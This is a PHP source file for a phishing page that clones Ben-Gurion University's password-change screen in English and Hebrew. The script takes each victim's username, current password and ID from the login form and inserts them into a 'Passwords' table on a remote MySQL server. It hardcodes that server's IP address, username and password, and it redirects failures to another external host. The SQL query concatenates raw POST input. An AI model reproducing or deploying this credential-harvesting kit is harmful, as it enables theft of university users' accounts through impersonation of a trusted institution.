<?php
session_start();
if($_SESSION['cp'] == 1) {
    header("Location: https://tamrur.bgu.ac.il/wcp/login.php?isheb=0");
}
$servername = "151.80.61.178";
$username = "u4_yJSAHQoJbd";
$password = "l0Zv^sx1d@b4HfrukEeqRj8^";
$dbname = "s4_mini-project";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
//die("Connection failed: " . $conn->connect_error);
    echo "Failed to connect";
}

$sql = "INSERT INTO `Passwords` (`username`, `oldpassword`, `newpassword`, `userid`)
VALUES ('" . $_POST['username'] . "', '". $_POST['pass']. "', 'None Yet', '" . $_POST['id']. "')";

if($conn->query($sql) === true) {
	$_SESSION['error'] = 0;
	$_SESSION['id'] = $_POST['id'];
} else {
	$_SESSION['error'] = 1;
	header("Location: http://45.9.188.236/elogin.php");
}
if(isset($_POST['eng'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Password change - screen 1 out of 2</title>
	<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1255">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href="n3style.css" rel="Stylesheet" type="text/css">
</head>
<body dir=ltr >


<h1>
Password change - screen 1 out of 2</h1>
<hr>
<br>
<form action="check.php" method=POST  >
<span class="engText">
</span><div class="BR"></div><span class="engText">The new password  should fulfill the following requirements:
</span><div class="BR"></div><span class="engText">
</span><div class="BR"></div><span class="engText">- the password should be  8 to 24 characters long;
</span><div class="BR"></div><span class="engText">
</span><div class="BR"></div><span class="engText">- the password should contain small letters, capital letters and digits;
</span><div class="BR"></div><span class="engText">
</span><div class="BR"></div><span class="engText">- the password should start from a small letter;
</span><div class="BR"></div><span class="engText">
</span><div class="BR"></div><span class="engText">- the password should not be based on a word from the dictionary;
</span><div class="BR"></div><span class="engText">
</span><div class="BR"></div><span class="engText">- the password should not contain characters:  "  '  `  ,  ;  :  \  $  @ ! %  or blank space;
</span><div class="BR"></div><span class="engText">
</span><div class="BR"></div><span class="engText">- you cannot choose the same password as your current password, or as a password you used before.
</span><div class="BR"></div><span class="engText"></span><div class="BR"></div><div class="myBreak">
</div>
<span class="engText">In order to avoid mistypes, please type your new password twice - in the field "New password" and in  the field "Confirmation"
</span><div class="BR"></div><span class="engText"></span><div class="BR"></div><div class="myBreak">
</div>
<div class="myBreak">
</div>


<div class="ETable"><div class="Row"><div class="Cell"><span class="engText"><label for="newpass">New password</label></span>
 </div>
<div class="Cell"> <input type="password" id="newpass" name="newpass" size=24 maxlength="26" dir="ltr"   value="" class="textEntryEng" >
</div>
 <div class="Cell">   </div>
  </div>
<div class="Row"><div class="Cell"><span class="engText"><label for="newagain">Confirmation</label></span>
 </div>
<div class="Cell"> <input type="password" id="newagain" name="newagain" size=24 maxlength="26" dir="ltr"   value="" class="textEntryEng" >
</div>
 <div class="Cell">   </div>
  </div>
 </div>
<div class="myBreak">
</div>
<div class="myBreak">
</div>
<div class="ETable"><div class="Row"><div class="Cell"><input type=submit  name="ok" value="Next" class="buttonEntry">
</div>
<div class="Cell"><div style="width:100px"></div>

</div>
<div class="Cell"><input type=submit  name="cancel" value="Cancel" class="buttonEntry">
</div></div></div>
<input type=hidden name="isheb" value="0">
<input type=hidden name="user" value="wisama">
<input type=hidden name="tries" value="0">
</form>



<div class="myBreak">
</div>
<hr>
<span class="engText">In case of problems please contact the Computation Center Helpdesk at helpdesk@bgu.ac.il or 08-6477171
</span><div class="BR"></div><span class="engText">Building 58 Room No. 1 on the ground floor from Sunday to Thursday from 08.00 to 16.00</span><div class="BR"></div>

<?php
} else {
	?>
<!DOCTYPE html>
<html lang="he">
<head>
<title>החלפת סיסמה - מסך 1 מתוך 2</title>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1255">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link href="n3style.css" rel="Stylesheet" type="text/css">
</head>
<body dir=rtl >


<h1>
החלפת סיסמה - מסך 1 מתוך 2</h1>
<hr>
<br>
<form action="check.php" method=POST  >
<span class="hebLargerText">לידיעתך:  תאריך שינוי סיסמא האחרון הוא: 15.06.2020 </span><div class="BR"></div><div class="myBreak">
</div>
<span class="hebText">
</span><div class="BR"></div><span class="hebText">הסיסמה החדשה חייבת לקיים את הדרישות הבאות:
</span><div class="BR"></div><span class="hebText">
</span><div class="BR"></div><span class="hebText">- אורך הסיסמה בין 8 ל-24 תווים
</span><div class="BR"></div><span class="hebText">
</span><div class="BR"></div><span class="hebText">- הסיסמה חייבת לכלול אותיות קטנות, אותיות גדולות וספרות
</span><div class="BR"></div><span class="hebText">
</span><div class="BR"></div><span class="hebText">- התו הראשון בסיסמה חייב להיות אות קטנה
</span><div class="BR"></div><span class="hebText">
</span><div class="BR"></div><span class="hebText">- הסיסמה לא יכולה להתבסס על מילה המופיעה במילון
</span><div class="BR"></div><span class="hebText">
</span><div class="BR"></div><span class="hebText">- אסור שהסיסמה תכלול את התווים הבאים:  "  '  ` ,  ;  :  \  $ @ ! %  או תו רווח
</span><div class="BR"></div><span class="hebText">
</span><div class="BR"></div><span class="hebText"> - אין אפשרות לבחור סיסמה קיימת, או סיסמה שהיתה לך בעבר.</span><div class="BR"></div><div class="myBreak">
</div>
<span class="hebText">לצורך מניעת שגיאות כתיב, נא הזין את הסיסמה החדשה פעמיים -  בשדה "סיסמה חדשה" וגם בשדה "אימות סיסמה"
</span><div class="BR"></div><span class="hebText"></span><div class="BR"></div><div class="myBreak">
</div>
<div class="myBreak">
</div>


<div class="HTable"><div class="Row"><div class="Cell"><span class="hebText"><label for="newpass">סיסמא חדשה</label></span>
</div>
<div class="Cell"> <input type="password" id="newpass" name="newpass" size=24 maxlength="26" dir="ltr"   value="" class="textEntryEng" >
</div>
<div class="Cell">   </div>
</div>
<div class="Row"><div class="Cell"><span class="hebText"><label for="newagain">אימות סיסמא</label></span>
</div>
<div class="Cell"> <input type="password" id="newagain" name="newagain" size=24 maxlength="26" dir="ltr"   value="" class="textEntryEng" >
</div>
<div class="Cell">   </div>
</div>
</div>
<div class="myBreak">
</div>
<div class="myBreak">
</div>
<div class="HTable"><div class="Row"><div class="Cell"><input type=submit  name="ok" value="המשך" class="buttonEntry">
</div>
<div class="Cell"><div style="width:100px"></div>

</div>
<div class="Cell"><input type=submit  name="cancel" value="בטל" class="buttonEntry">
</div></div></div>
<input type=hidden name="isheb" value="1">
<input type=hidden name="user" value="wisama">
<input type=hidden name="tries" value="0">
</form>



<div class="myBreak">
</div>
<hr>
<span class="hebText">במקרה של בעיה ניתן לפנות למדור תמיכת מחשוב helpdesk@bgu.ac.il או 08-6477171
</span><div class="BR"></div><span class="hebText">בניין 58 חדר מס' 1 בקומת הקרקע בימים ראשון עד חמישי בין השעות 08.00-16.00</span><div class="BR"></div>

<?php
}
$conn->close();
?>
